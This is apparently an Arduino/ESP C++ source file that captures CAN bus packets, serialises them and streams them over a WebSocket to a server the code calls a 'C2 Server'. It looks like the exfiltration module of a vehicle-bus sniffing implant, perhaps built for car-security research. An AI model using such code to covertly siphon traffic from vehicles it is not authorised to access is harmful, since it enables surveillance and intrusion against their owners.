#include <WebSocketsClient.h>
#include <cppQueue.h>

#include "defines.h"
#include "websocket.h"

const int WEBSOCKET_RECONNECT_INTERVAL = 5000;

const long BROADCAST_INTERVAL = 10; // milliseconds
long last_broadcast = 0;

// Maximum of can packets allowed in broadcast queue between broadcasts
const uint16_t MAX_CAN_PACKET_BACKUP = 100;
cppQueue can_packet_queue(sizeof(can_packet), MAX_CAN_PACKET_BACKUP);

WiFiClient client;
WebSocketsClient websocket;

static void broadcast_available();
static void handle_websocket_event(WStype_t type, uint8_t *payload, size_t length);

void init_websocket()
{
    websocket.begin(C2_ADDR, C2_PORT);
    websocket.onEvent(handle_websocket_event);
    websocket.setReconnectInterval(WEBSOCKET_RECONNECT_INTERVAL);

    can_packet_queue.clean();

    DEBUG_PRINTLN("C2 Server Target:");
    DEBUG_PRINT("Address: ");
    DEBUG_PRINTLN(C2_ADDR);
    DEBUG_PRINT("Port: ");
    DEBUG_PRINTLN(C2_PORT);
}

void loop_websocket()
{
    websocket.loop();

    const long current = millis();
    if (current - last_broadcast > BROADCAST_INTERVAL) {
        broadcast_available();
        last_broadcast = current;
    }
}

void stream_can_packet(can_packet *packet)
{
    can_packet_queue.push(packet);
}

static void broadcast_available()
{
    // Drain queue of can_packets
    can_packet packet;
    while (can_packet_queue.pop(&packet)) {
        DEBUG_PRINT("Broadcasting can packet with id: ");
        DEBUG_PRINT(packet.id);
        DEBUG_PRINT(" and len: ");
        DEBUG_PRINTLN(packet.len);

        // Serialize can_packet struct into byte array
        size_t buf_len = sizeof(can_packet) - sizeof(byte *) + (packet.len * sizeof(byte));
        byte buf[buf_len];

        int marker = 0;
        memcpy(buf, &(packet.id), sizeof(long));
        marker += sizeof(long);

        memcpy(buf + marker, &(packet.len), sizeof(size_t));
        marker += sizeof(size_t);

        memcpy(buf + marker, packet.data, packet.len * sizeof(byte));

        websocket.sendBIN(buf, buf_len);
    }
}

static void handle_websocket_event(WStype_t type, uint8_t *payload, size_t length)
{
    switch (type) {
    case WStype_DISCONNECTED:
        DEBUG_PRINTLN("[WSc] Disconnected!");
        break;
    case WStype_CONNECTED:
        DEBUG_PRINTLN("[WSc] Connected!");

        // send message to server when Connected
        websocket.sendTXT("Connected");
        break;
    case WStype_TEXT:
        DEBUG_PRINT("[WSc] get text:");
        DEBUG_PRINTLN((char *)payload);

        // send message to server
        // websocket.sendTXT("message here");
        break;
    case WStype_BIN:
        // send data to server
        // websocket.sendBIN(payload, length);
        break;
    case WStype_ERROR:
    case WStype_FRAGMENT_TEXT_START:
    case WStype_FRAGMENT_BIN_START:
    case WStype_FRAGMENT:
    case WStype_PING:
    case WStype_PONG:
    case WStype_FRAGMENT_FIN:
        break;
    }
}